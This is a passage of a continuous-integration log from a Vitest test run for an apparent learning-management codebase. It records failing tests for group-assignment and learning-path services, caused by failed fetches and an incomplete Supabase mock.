2025-11-18T17:35:44.1386279Z       at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:135:14
2025-11-18T17:35:44.1388000Z       at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:58:26 {
2025-11-18T17:35:44.1388955Z     input: [32m'/api/assignments/submit-group'[39m,
2025-11-18T17:35:44.1389369Z     code: [32m'ERR_INVALID_URL'[39m
2025-11-18T17:35:44.1389604Z   }
2025-11-18T17:35:44.1389759Z }
2025-11-18T17:35:44.1389850Z 
2025-11-18T17:35:44.1552865Z [90mstderr[2m | lib/services/__tests__/groupAssignmentsV2.test.js[2m > [22m[2mGroupAssignmentsV2Service[2m > [22m[2mgetGroupMembers - Data Structure[2m > [22m[2mshould transform profile data to include user.full_name[22m[39m
2025-11-18T17:35:44.1554447Z Error fetching group members: {
2025-11-18T17:35:44.1554943Z   message: [32m'TypeError: fetch failed'[39m,
2025-11-18T17:35:44.1555348Z   details: [32m'TypeError: fetch failed\n'[39m +
2025-11-18T17:35:44.1555785Z     [32m'    at node:internal/deps/undici/undici:12637:11\n'[39m +
2025-11-18T17:35:44.1556377Z     [32m'    at processTicksAndRejections (node:internal/process/task_queues:95:5)\n'[39m +
2025-11-18T17:35:44.1557619Z     [32m'    at GroupAssignmentsV2Service.getGroupMembers (/home/runner/work/fne-lms/fne-lms/lib/services/groupAssignmentsV2.js:487:40)\n'[39m +
2025-11-18T17:35:44.1558582Z     [32m'    at /home/runner/work/fne-lms/fne-lms/lib/services/__tests__/groupAssignmentsV2.test.js:229:22\n'[39m +
2025-11-18T17:35:44.1559424Z     [32m'    at runTest (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:663:11)\n'[39m +
2025-11-18T17:35:44.1561413Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:44.1562396Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:44.1564065Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:44.1565693Z     [32m'    at runFiles (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:834:5)\n'[39m +
2025-11-18T17:35:44.1567481Z     [32m'    at startTests (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:843:3)'[39m,
2025-11-18T17:35:44.1568019Z   hint: [32m''[39m,
2025-11-18T17:35:44.1568340Z   code: [32m''[39m
2025-11-18T17:35:44.1568532Z }
2025-11-18T17:35:44.1568620Z 
2025-11-18T17:35:44.1615616Z [90mstderr[2m | lib/services/__tests__/groupAssignmentsV2.test.js[2m > [22m[2mGroupAssignmentsV2Service[2m > [22m[2mgetGroupMembers - Data Structure[2m > [22m[2mshould handle empty name fields gracefully[22m[39m
2025-11-18T17:35:44.1617334Z Error fetching group members: {
2025-11-18T17:35:44.1617733Z   message: [32m'TypeError: fetch failed'[39m,
2025-11-18T17:35:44.1618117Z   details: [32m'TypeError: fetch failed\n'[39m +
2025-11-18T17:35:44.1618756Z     [32m'    at node:internal/deps/undici/undici:12637:11\n'[39m +
2025-11-18T17:35:44.1619348Z     [32m'    at processTicksAndRejections (node:internal/process/task_queues:95:5)\n'[39m +
2025-11-18T17:35:44.1620258Z     [32m'    at GroupAssignmentsV2Service.getGroupMembers (/home/runner/work/fne-lms/fne-lms/lib/services/groupAssignmentsV2.js:487:40)\n'[39m +
2025-11-18T17:35:44.1621197Z     [32m'    at /home/runner/work/fne-lms/fne-lms/lib/services/__tests__/groupAssignmentsV2.test.js:257:22\n'[39m +
2025-11-18T17:35:44.1622195Z     [32m'    at runTest (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:663:11)\n'[39m +
2025-11-18T17:35:44.1624063Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:44.1625732Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:44.1627453Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:44.1628417Z     [32m'    at runFiles (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:834:5)\n'[39m +
2025-11-18T17:35:44.1629269Z     [32m'    at startTests (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:843:3)'[39m,
2025-11-18T17:35:44.1629786Z   hint: [32m''[39m,
2025-11-18T17:35:44.1630016Z   code: [32m''[39m
2025-11-18T17:35:44.1630207Z }
2025-11-18T17:35:44.1630294Z 
2025-11-18T17:35:44.1678217Z [90mstderr[2m | lib/services/__tests__/groupAssignmentsV2.test.js[2m > [22m[2mGroupAssignmentsV2Service[2m > [22m[2mgetGroupMembers - Data Structure[2m > [22m[2mshould handle missing last name[22m[39m
2025-11-18T17:35:44.1679653Z Error fetching group members: {
2025-11-18T17:35:44.1680067Z   message: [32m'TypeError: fetch failed'[39m,
2025-11-18T17:35:44.1680911Z   details: [32m'TypeError: fetch failed\n'[39m +
2025-11-18T17:35:44.1681919Z     [32m'    at node:internal/deps/undici/undici:12637:11\n'[39m +
2025-11-18T17:35:44.1683011Z     [32m'    at processTicksAndRejections (node:internal/process/task_queues:95:5)\n'[39m +
2025-11-18T17:35:44.1684758Z     [32m'    at GroupAssignmentsV2Service.getGroupMembers (/home/runner/work/fne-lms/fne-lms/lib/services/groupAssignmentsV2.js:487:40)\n'[39m +
2025-11-18T17:35:44.1686251Z     [32m'    at /home/runner/work/fne-lms/fne-lms/lib/services/__tests__/groupAssignmentsV2.test.js:272:22\n'[39m +
2025-11-18T17:35:44.1687397Z     [32m'    at runTest (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:663:11)\n'[39m +
2025-11-18T17:35:44.1688504Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:44.1689332Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:44.1690170Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:44.1690987Z     [32m'    at runFiles (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:834:5)\n'[39m +
2025-11-18T17:35:44.1692224Z     [32m'    at startTests (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:843:3)'[39m,
2025-11-18T17:35:44.1693110Z   hint: [32m''[39m,
2025-11-18T17:35:44.1693718Z   code: [32m''[39m
2025-11-18T17:35:44.1694042Z }
2025-11-18T17:35:44.1694213Z 
2025-11-18T17:35:44.1734701Z [90mstderr[2m | lib/services/__tests__/groupAssignmentsV2.test.js[2m > [22m[2mGroupAssignmentsV2Service[2m > [22m[2mgetOrCreateGroup - Policy Error Handling[2m > [22m[2mshould return error for RLS infinite recursion (42P17)[22m[39m
2025-11-18T17:35:44.1736519Z [GroupAssignments] Unexpected error checking group membership: {
2025-11-18T17:35:44.1737601Z   message: [32m'TypeError: fetch failed'[39m,
2025-11-18T17:35:44.1738020Z   details: [32m'TypeError: fetch failed\n'[39m +
2025-11-18T17:35:44.1738457Z     [32m'    at node:internal/deps/undici/undici:12637:11\n'[39m +
2025-11-18T17:35:44.1739017Z     [32m'    at processTicksAndRejections (node:internal/process/task_queues:95:5)\n'[39m +
2025-11-18T17:35:44.1739937Z     [32m'    at GroupAssignmentsV2Service.getOrCreateGroup (/home/runner/work/fne-lms/fne-lms/lib/services/groupAssignmentsV2.js:310:65)\n'[39m +
2025-11-18T17:35:44.1741977Z     [32m'    at /home/runner/work/fne-lms/fne-lms/lib/services/__tests__/groupAssignmentsV2.test.js:292:22\n'[39m +
2025-11-18T17:35:44.1743612Z     [32m'    at runTest (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:663:11)\n'[39m +
2025-11-18T17:35:44.1745307Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:44.1746287Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:44.1747405Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:44.1748276Z     [32m'    at runFiles (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:834:5)\n'[39m +
2025-11-18T17:35:44.1749099Z     [32m'    at startTests (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:843:3)'[39m,
2025-11-18T17:35:44.1749595Z   hint: [32m''[39m,
2025-11-18T17:35:44.1749816Z   code: [32m''[39m
2025-11-18T17:35:44.1749996Z }
2025-11-18T17:35:44.1750087Z 
2025-11-18T17:35:44.1797468Z [90mstderr[2m | lib/services/__tests__/groupAssignmentsV2.test.js[2m > [22m[2mGroupAssignmentsV2Service[2m > [22m[2mgetOrCreateGroup - Policy Error Handling[2m > [22m[2mshould return error for permission denied (42501)[22m[39m
2025-11-18T17:35:44.1799219Z [GroupAssignments] Unexpected error checking group membership: {
2025-11-18T17:35:44.1799730Z   message: [32m'TypeError: fetch failed'[39m,
2025-11-18T17:35:44.1800110Z   details: [32m'TypeError: fetch failed\n'[39m +
2025-11-18T17:35:44.1800539Z     [32m'    at node:internal/deps/undici/undici:12637:11\n'[39m +
2025-11-18T17:35:44.1801707Z     [32m'    at processTicksAndRejections (node:internal/process/task_queues:95:5)\n'[39m +
2025-11-18T17:35:44.1803505Z     [32m'    at GroupAssignmentsV2Service.getOrCreateGroup (/home/runner/work/fne-lms/fne-lms/lib/services/groupAssignmentsV2.js:310:65)\n'[39m +
2025-11-18T17:35:44.1805589Z     [32m'    at /home/runner/work/fne-lms/fne-lms/lib/services/__tests__/groupAssignmentsV2.test.js:312:22\n'[39m +
2025-11-18T17:35:44.1806979Z     [32m'    at runTest (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:663:11)\n'[39m +
2025-11-18T17:35:44.1807945Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:44.1808834Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:44.1809663Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:44.1810479Z     [32m'    at runFiles (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:834:5)\n'[39m +
2025-11-18T17:35:44.1811293Z     [32m'    at startTests (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:843:3)'[39m,
2025-11-18T17:35:44.1811787Z   hint: [32m''[39m,
2025-11-18T17:35:44.1812009Z   code: [32m''[39m
2025-11-18T17:35:44.1812193Z }
2025-11-18T17:35:44.1812282Z 
2025-11-18T17:35:44.1877843Z [90mstderr[2m | lib/services/__tests__/groupAssignmentsV2.test.js[2m > [22m[2mGroupAssignmentsV2Service[2m > [22m[2mgetOrCreateGroup - Policy Error Handling[2m > [22m[2mshould return error for unexpected database errors (not PGRST116)[22m[39m
2025-11-18T17:35:44.1879190Z [GroupAssignments] Unexpected error checking group membership: {
2025-11-18T17:35:44.1879685Z   message: [32m'TypeError: fetch failed'[39m,
2025-11-18T17:35:44.1880064Z   details: [32m'TypeError: fetch failed\n'[39m +
2025-11-18T17:35:44.1880492Z     [32m'    at node:internal/deps/undici/undici:12637:11\n'[39m +
2025-11-18T17:35:44.1881064Z     [32m'    at processTicksAndRejections (node:internal/process/task_queues:95:5)\n'[39m +
2025-11-18T17:35:44.1881994Z     [32m'    at GroupAssignmentsV2Service.getOrCreateGroup (/home/runner/work/fne-lms/fne-lms/lib/services/groupAssignmentsV2.js:310:65)\n'[39m +
2025-11-18T17:35:44.1882955Z     [32m'    at /home/runner/work/fne-lms/fne-lms/lib/services/__tests__/groupAssignmentsV2.test.js:334:22\n'[39m +
2025-11-18T17:35:44.1884567Z     [32m'    at runTest (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:663:11)\n'[39m +
2025-11-18T17:35:44.1885599Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:44.1886459Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:44.1888066Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:44.1889689Z     [32m'    at runFiles (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:834:5)\n'[39m +
2025-11-18T17:35:44.1891245Z     [32m'    at startTests (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:843:3)'[39m,
2025-11-18T17:35:44.1891889Z   hint: [32m''[39m,
2025-11-18T17:35:44.1892172Z   code: [32m''[39m
2025-11-18T17:35:44.1892357Z }
2025-11-18T17:35:44.1892444Z 
2025-11-18T17:35:44.1943217Z [90mstderr[2m | lib/services/__tests__/groupAssignmentsV2.test.js[2m > [22m[2mGroupAssignmentsV2Service[2m > [22m[2mgetOrCreateGroup - Policy Error Handling[2m > [22m[2mshould proceed to create group when error is PGRST116 (no rows found)[22m[39m
2025-11-18T17:35:44.1944338Z [GroupAssignments] Unexpected error checking group membership: {
2025-11-18T17:35:44.1944813Z   message: [32m'TypeError: fetch failed'[39m,
2025-11-18T17:35:44.1945194Z   details: [32m'TypeError: fetch failed\n'[39m +
2025-11-18T17:35:44.1945618Z     [32m'    at node:internal/deps/undici/undici:12637:11\n'[39m +
2025-11-18T17:35:44.1946411Z     [32m'    at processTicksAndRejections (node:internal/process/task_queues:95:5)\n'[39m +
2025-11-18T17:35:44.1947634Z     [32m'    at GroupAssignmentsV2Service.getOrCreateGroup (/home/runner/work/fne-lms/fne-lms/lib/services/groupAssignmentsV2.js:310:65)\n'[39m +
2025-11-18T17:35:44.1948610Z     [32m'    at /home/runner/work/fne-lms/fne-lms/lib/services/__tests__/groupAssignmentsV2.test.js:366:22\n'[39m +
2025-11-18T17:35:44.1949437Z     [32m'    at runTest (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:663:11)\n'[39m +
2025-11-18T17:35:44.1950941Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:44.1952595Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:44.1954210Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:44.1955494Z     [32m'    at runFiles (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:834:5)\n'[39m +
2025-11-18T17:35:44.1956454Z     [32m'    at startTests (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:843:3)'[39m,
2025-11-18T17:35:44.1957363Z   hint: [32m''[39m,
2025-11-18T17:35:44.1958051Z   code: [32m''[39m
2025-11-18T17:35:44.1958254Z }
2025-11-18T17:35:44.1958346Z 
2025-11-18T17:35:44.1989490Z  [33m❯[39m lib/services/__tests__/groupAssignmentsV2.test.js [2m ([22m[2m17 tests[22m [2m|[22m [31m7 failed[39m[2m)[22m[90m 239[2mms[22m[39m
2025-11-18T17:35:44.1994572Z [90mstderr[2m | lib/services/__tests__/groupAssignmentsV2.test.js[2m > [22m[2mGroupAssignmentsV2Service[2m > [22m[2mgetOrCreateGroup - Policy Error Handling[2m > [22m[2mshould not attempt insert when non-PGRST116 error occurs[22m[39m
2025-11-18T17:35:44.1995619Z [GroupAssignments] Unexpected error checking group membership: {
2025-11-18T17:35:44.1996068Z   message: [32m'TypeError: fetch failed'[39m,
2025-11-18T17:35:44.1996435Z   details: [32m'TypeError: fetch failed\n'[39m +
2025-11-18T17:35:44.1997084Z     [32m'    at node:internal/deps/undici/undici:12637:11\n'[39m +
2025-11-18T17:35:44.1997662Z     [32m'    at processTicksAndRejections (node:internal/process/task_queues:95:5)\n'[39m +
2025-11-18T17:35:44.1998591Z     [32m'    at GroupAssignmentsV2Service.getOrCreateGroup (/home/runner/work/fne-lms/fne-lms/lib/services/groupAssignmentsV2.js:310:65)\n'[39m +
2025-11-18T17:35:44.1999545Z     [32m'    at /home/runner/work/fne-lms/fne-lms/lib/services/__tests__/groupAssignmentsV2.test.js:389:7\n'[39m +
2025-11-18T17:35:44.2000365Z     [32m'    at runTest (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:663:11)\n'[39m +
2025-11-18T17:35:44.2001198Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:44.2002030Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:44.2002857Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:44.2004422Z     [32m'    at runFiles (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:834:5)\n'[39m +
2025-11-18T17:35:44.2006046Z     [32m'    at startTests (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:843:3)'[39m,
2025-11-18T17:35:44.2007197Z   hint: [32m''[39m,
2025-11-18T17:35:44.2007574Z   code: [32m''[39m
2025-11-18T17:35:44.2007876Z }
2025-11-18T17:35:44.2008010Z 
2025-11-18T17:35:44.2009668Z [31m   [33m❯[31m lib/services/__tests__/groupAssignmentsV2.test.js[2m > [22mGroupAssignmentsV2Service[2m > [22mgetGroupMembers - Data Structure[2m > [22mshould transform profile data to include user.full_name[39m
2025-11-18T17:35:44.2011487Z [31m     → expected [] to have a length of 1 but got +0[39m
2025-11-18T17:35:44.2013277Z [31m   [33m❯[31m lib/services/__tests__/groupAssignmentsV2.test.js[2m > [22mGroupAssignmentsV2Service[2m > [22mgetGroupMembers - Data Structure[2m > [22mshould handle empty name fields gracefully[39m
2025-11-18T17:35:44.2014762Z [31m     → Cannot read properties of undefined (reading 'user')[39m
2025-11-18T17:35:44.2016544Z [31m   [33m❯[31m lib/services/__tests__/groupAssignmentsV2.test.js[2m > [22mGroupAssignmentsV2Service[2m > [22mgetGroupMembers - Data Structure[2m > [22mshould handle missing last name[39m
2025-11-18T17:35:44.2018286Z [31m     → Cannot read properties of undefined (reading 'user')[39m
2025-11-18T17:35:44.2020485Z [31m   [33m❯[31m lib/services/__tests__/groupAssignmentsV2.test.js[2m > [22mGroupAssignmentsV2Service[2m > [22mgetOrCreateGroup - Policy Error Handling[2m > [22mshould return error for RLS infinite recursion (42P17)[39m
2025-11-18T17:35:44.2022438Z [31m     → expected 'TypeError: fetch failed' to include 'Error de configuración del sistema'[39m
2025-11-18T17:35:44.2024890Z [31m   [33m❯[31m lib/services/__tests__/groupAssignmentsV2.test.js[2m > [22mGroupAssignmentsV2Service[2m > [22mgetOrCreateGroup - Policy Error Handling[2m > [22mshould return error for permission denied (42501)[39m
2025-11-18T17:35:44.2026709Z [31m     → expected 'TypeError: fetch failed' to include 'No tienes permiso'[39m
2025-11-18T17:35:44.2029919Z [31m   [33m❯[31m lib/services/__tests__/groupAssignmentsV2.test.js[2m > [22mGroupAssignmentsV2Service[2m > [22mgetOrCreateGroup - Policy Error Handling[2m > [22mshould return error for unexpected database errors (not PGRST116)[39m
2025-11-18T17:35:44.2031796Z [31m     → expected { …(4) } to be { code: 'PGRST301', …(1) } // Object.is equality[39m
2025-11-18T17:35:44.2034058Z [31m   [33m❯[31m lib/services/__tests__/groupAssignmentsV2.test.js[2m > [22mGroupAssignmentsV2Service[2m > [22mgetOrCreateGroup - Policy Error Handling[2m > [22mshould proceed to create group when error is PGRST116 (no rows found)[39m
2025-11-18T17:35:44.2035671Z [31m     → expected { …(4) } to be null[39m
2025-11-18T17:35:44.6204771Z  [33m❯[39m __tests__/integration/learning-path-tracking-validation.test.ts [2m ([22m[2m10 tests[22m [2m|[22m [31m10 failed[39m[2m)[22m[90m 33[2mms[22m[39m
2025-11-18T17:35:44.6210629Z [31m   [33m❯[31m __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22mLearning Path Tracking System Validation[2m > [22mProgress Calculation Accuracy[2m > [22mshould correctly calculate progress percentages for different completion scenarios[39m
2025-11-18T17:35:44.6230550Z [90mstderr[2m | __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22m[2mLearning Path Tracking System Validation[2m > [22m[2mProgress Calculation Accuracy[2m > [22m[2mshould correctly calculate progress percentages for different completion scenarios[22m[39m
2025-11-18T17:35:44.6233406Z [LearningPathsService] Error in getLearningPathDetailsForUser: TypeError: supabaseClient.from(...).select(...).eq(...).eq(...).not is not a function
2025-11-18T17:35:44.6235386Z     at Function.getLearningPathDetailsForUser [90m(/home/runner/work/fne-lms/fne-lms/[39mlib/services/learningPathsService.ts:528:10[90m)[39m
2025-11-18T17:35:44.6237191Z     at [90m/home/runner/work/fne-lms/fne-lms/[39m__tests__/integration/learning-path-tracking-validation.test.ts:62:49
2025-11-18T17:35:44.6238634Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:135:14
2025-11-18T17:35:44.6239904Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:58:26
2025-11-18T17:35:44.6241353Z     at runTest [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:663:17[90m)[39m
2025-11-18T17:35:44.6243274Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6244794Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6246318Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6248172Z     at runFiles [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:834:5[90m)[39m
2025-11-18T17:35:44.6249707Z     at startTests [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:843:3[90m)[39m
2025-11-18T17:35:44.6250414Z 
2025-11-18T17:35:44.6252291Z [90mstderr[2m | __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22m[2mLearning Path Tracking System Validation[2m > [22m[2mProgress Calculation Accuracy[2m > [22m[2mshould handle 100% completion correctly[22m[39m
2025-11-18T17:35:44.6254565Z [LearningPathsService] Error in getLearningPathDetailsForUser: TypeError: supabaseClient.from(...).select(...).eq(...).eq(...).not is not a function
2025-11-18T17:35:44.6256709Z     at Function.getLearningPathDetailsForUser [90m(/home/runner/work/fne-lms/fne-lms/[39mlib/services/learningPathsService.ts:528:10[90m)[39m
2025-11-18T17:35:44.6258673Z     at [90m/home/runner/work/fne-lms/fne-lms/[39m__tests__/integration/learning-path-tracking-validation.test.ts:102:49
2025-11-18T17:35:44.6260129Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:135:14
2025-11-18T17:35:44.6261465Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:58:26
2025-11-18T17:35:44.6262925Z     at runTest [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:663:17[90m)[39m
2025-11-18T17:35:44.6264464Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6265938Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6267699Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6269282Z     at runFiles [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:834:5[90m)[39m
2025-11-18T17:35:44.6270829Z     at startTests [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:843:3[90m)[39m
2025-11-18T17:35:44.6271539Z 
2025-11-18T17:35:44.6273417Z [90mstderr[2m | __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22m[2mLearning Path Tracking System Validation[2m > [22m[2mProgress Calculation Accuracy[2m > [22m[2mshould handle zero progress correctly[22m[39m
2025-11-18T17:35:44.6275777Z [LearningPathsService] Error in getLearningPathDetailsForUser: TypeError: supabaseClient.from(...).select(...).eq(...).eq(...).not is not a function
2025-11-18T17:35:44.6277915Z     at Function.getLearningPathDetailsForUser [90m(/home/runner/work/fne-lms/fne-lms/[39mlib/services/learningPathsService.ts:528:10[90m)[39m
2025-11-18T17:35:44.6279683Z     at [90m/home/runner/work/fne-lms/fne-lms/[39m__tests__/integration/learning-path-tracking-validation.test.ts:136:49
2025-11-18T17:35:44.6281128Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:135:14
2025-11-18T17:35:44.6282456Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:58:26
2025-11-18T17:35:44.6283903Z     at runTest [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:663:17[90m)[39m
2025-11-18T17:35:44.6285735Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6287534Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6289090Z     at runSuite [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:782:15[90m)[39m
2025-11-18T17:35:44.6290574Z     at runFiles [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:834:5[90m)[39m
2025-11-18T17:35:44.6292051Z     at startTests [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:843:3[90m)[39m
2025-11-18T17:35:44.6292728Z 
2025-11-18T17:35:44.6294765Z [90mstderr[2m | __tests__/integration/learning-path-tracking-validation.test.ts[2m > [22m[2mLearning Path Tracking System Validation[2m > [22m[2mButton Text and Variants Validation[2m > [22m[2mshould assign correct button text and variants based on course status[22m[39m
2025-11-18T17:35:44.6297323Z [LearningPathsService] Error in getLearningPathDetailsForUser: TypeError: supabaseClient.from(...).select(...).eq(...).eq(...).not is not a function
2025-11-18T17:35:44.6299372Z     at Function.getLearningPathDetailsForUser [90m(/home/runner/work/fne-lms/fne-lms/[39mlib/services/learningPathsService.ts:528:10[90m)[39m
2025-11-18T17:35:44.6300989Z     at [90m/home/runner/work/fne-lms/fne-lms/[39m__tests__/integration/learning-path-tracking-validation.test.ts:186:49
2025-11-18T17:35:44.6302329Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:135:14
2025-11-18T17:35:44.6303570Z     at [90mfile:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:58:26
2025-11-18T17:35:44.6304936Z     at runTest [90m(file:///home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@vitest[24m/runner/dist/index.js:663:17[90m)[39m
